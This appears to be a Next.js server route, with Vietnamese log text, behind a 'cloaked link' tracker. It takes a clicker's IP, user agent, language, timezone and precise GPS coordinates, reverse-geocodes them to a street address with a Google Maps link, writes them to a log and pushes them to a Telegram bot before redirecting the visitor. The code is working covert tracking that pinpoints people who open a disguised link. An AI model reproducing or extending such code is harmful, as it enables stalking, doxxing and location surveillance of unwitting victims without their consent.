
'use server';

import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { headers } from 'next/headers';
import { getVerificationConfigAction } from '@/app/actions/settings';
import { getCloakedLinksAction } from '@/app/actions/cloaked-links';

async function getAddress(lat: number, lon: number): Promise<string> {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
          headers: {
            'User-Agent': 'FirebaseStudio/1.0'
          }
        });
        if (!response.ok) return "Không thể lấy địa chỉ.";

        const data = await response.json();
        return data.display_name || "Không tìm thấy tên địa chỉ.";
    } catch (error) {
        return "Lỗi khi truy vấn địa chỉ.";
    }
}

async function sendTelegramNotification(message: string) {
    try {
        const config = await getVerificationConfigAction();
        if (
            !config.telegramNotificationsEnabled ||
            !config.telegramBotToken ||
            !config.telegramChatId
        ) {
            return;
        }

        const botToken = config.telegramBotToken;
        const chatId = config.telegramChatId;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
            }),
        });
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { id, lat, lon, acc, ip, language, timezone } = body;

    if (!id) {
        return NextResponse.json({ error: 'Link ID is required' }, { status: 400 });
    }

    const links = await getCloakedLinksAction();
    const linkConfig = links.find(link => link.id === id);

    if (!linkConfig) {
        return NextResponse.json({ error: 'Link not found' }, { status: 404 });
    }

    const headersList = headers();
    const ua = headersList.get('user-agent') ?? 'unknown';
    const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
    const timestamp = new Date().toISOString();

    let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
    logData += `Nguồn: cloaker\n`;
    logData += `Thiết bị: ${ua}\n`;
    logData += `Địa chỉ IP: ${finalIp}\n`;
    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
    logData += `Múi giờ: ${timezone || 'N/A'}\n`;

    let telegramMessage = `*🔔 Truy cập mới (Link Bọc)!*\n\n`;
    telegramMessage += `*Tiêu đề:* \`${linkConfig.title}\`\n`;
    telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
    telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
    telegramMessage += `*Ngôn ngữ:* \`${language || 'N/A'}\`\n`;
    telegramMessage += `*Múi giờ:* \`${timezone || 'N/A'}\`\n`;

    if (lat !== undefined && lon !== undefined) {
        const address = await getAddress(lat, lon);
        const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
        
        logData += `Tọa độ: ${lat}, ${lon}\n`;
        logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
        logData += `Địa chỉ: ${address}\n`;
        logData += `Link Google Maps: ${maps_link}\n`;

        telegramMessage += `*Vị trí:* ${address}\n`;
        telegramMessage += `*Tọa độ:* \`${lat}, ${lon}\`\n`;
        telegramMessage += `*Độ chính xác:* \`${acc || 'N/A'}m\`\n`;
        telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
    } else {
        logData += `Tọa độ: N/A\n`;
        logData += `Độ chính xác: N/A\n`;
        logData += `Địa chỉ: (Chỉ lấy IP, không có vị trí)\n`;
        logData += `Link Google Maps: N/A\n`;
    }
    
    logData += `Chuyển hướng đến: ${linkConfig.redirectUrl}\n`;
    logData += `----------------------------------\n`;
    
    telegramMessage += `*Chuyển hướng đến:* ${linkConfig.redirectUrl}\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');
    
    sendTelegramNotification(telegramMessage);
    
    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('Failed to log cloaked-link access:', error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Failed to process request', details: errorMessage }, { status: 500 });
  }
}
